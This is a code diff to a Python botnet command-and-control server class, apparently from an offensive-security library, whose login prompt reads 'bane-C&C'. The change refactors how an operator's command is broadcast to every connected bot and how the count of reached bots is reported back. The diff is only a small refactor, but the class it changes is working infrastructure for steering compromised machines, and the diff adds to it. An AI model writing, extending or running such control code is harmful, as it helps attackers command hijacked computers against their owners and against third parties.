@@ -11,11 +11,15 @@ class Botnet_C_C_Server:
     password_prompt="\r\npassword: "
     user_prompt="{}@bane-C&C:$"
 
+
+    def process_cmd(self,cmd,user_socket,user):
+        self.send_command(cmd,user_socket,user)
+
     def ping(self):
         while True:
             try:
                 time.sleep(self.pings_interval)
-                self.send_command(self.ping_command)
+                self.send_command(self.ping_command,None,None,is_ping=True)
             except:
                 break
 
@@ -24,7 +28,7 @@ class Botnet_C_C_Server:
             return True
         return False
 
-    def send_command(self,command):
+    def send_command(self,command,user_socket,user,is_ping=False):
         dead_bots=[]
         while True:
             time.sleep(0.1)
@@ -48,6 +52,8 @@ class Botnet_C_C_Server:
         for x in dead_bots:
             self.bots_list.remove(x)
         self.sending=False
+        if is_ping==False:
+            user_socket.send('\r\nCommand was sent to {} bots\r\n{}'.format(len(self.bots_list),Botnet_C_C_Server.user_prompt.format(user).strip()).strip().encode())
 
     def handle_bot(self,client_socket):
         try:
@@ -91,8 +97,7 @@ class Botnet_C_C_Server:
                         if '\n' in data:
                             data=data.strip()
                             break
-                    self.send_command(data.strip())   
-                    client_socket.send('\r\nCommand was sent to {} bots\r\n{}'.format(len(self.bots_list),Botnet_C_C_Server.user_prompt.format(user).strip()).strip().encode())
+                    self.process_cmd(data.strip(),client_socket,user)                       
             else:
                 client_socket.send('login failed'.encode())
                 client_socket.close()
